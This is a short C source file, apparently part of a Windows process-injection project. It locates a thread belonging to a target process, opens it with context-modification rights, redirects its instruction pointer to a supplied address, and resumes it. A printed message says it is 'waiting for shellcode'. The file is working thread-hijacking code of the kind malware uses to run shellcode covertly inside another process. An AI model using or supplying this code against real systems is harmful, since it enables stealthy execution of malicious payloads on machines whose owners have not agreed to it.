#include "injection.h"


BOOL GetThread(IN DWORD pid, OUT DWORD* tid, OUT HANDLE* hThread) {
	HANDLE hSnap = NULL;
	THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	if (!Thread32First(hSnap, &Thr)) {
		printf("Error: %d \n", GetLastError());
		CloseHandle(hSnap);
		return FALSE; }

	while (Thread32Next(hSnap, &Thr)) {
		if (Thr.th32OwnerProcessID == pid) {
			*tid = Thr.th32ThreadID;
			*hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
				THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, Thr.th32ThreadID);
			if (*hThread == NULL || Thr.th32ThreadID == 0) {
				printf("Error: %d \n", GetLastError());
				CloseHandle(hSnap);
				return FALSE;
			}
			break;
		}
	}
	CloseHandle(hSnap);
	return TRUE;
}

VOID temp(VOID) {
	printf("temp fun");
	return;
}


BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER };
	// SuspendThread(hThread);	 // UNCOMMENT to use 1st version, comment for 2nd

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("Failed to retrieve thread context \n");
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("SetThreadContext Failed \n");
		return FALSE;
	}

	ResumeThread(hThread);
	printf("Thred resumed, waiting for shellcode \n");

	WaitForSingleObject(hThread, INFINITE);
	printf("End sium");

	CloseHandle(hThread);

	return TRUE;
}

